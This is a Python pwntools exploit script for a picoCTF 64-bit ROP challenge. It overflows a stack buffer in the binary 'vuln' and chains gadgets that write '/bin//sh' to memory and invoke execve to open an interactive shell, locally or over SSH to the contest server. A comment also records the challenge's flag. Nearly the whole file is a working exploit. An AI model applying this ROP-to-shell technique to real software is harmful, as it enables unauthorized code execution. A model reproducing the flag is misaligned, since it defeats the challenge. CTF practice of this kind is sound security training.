from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_443262a9}
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/rop64_5_7fc3d57a7506f0b4564782f480c6c6c9')
  REMOTE = True


# ROPgadget --binary ./vuln --rop --badbytes "0a"
from struct import pack

p = 'a'*(16+8)
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000449135) # syscall ; ret

sh.sendlineafter('?\n', p)

sh.interactive()
  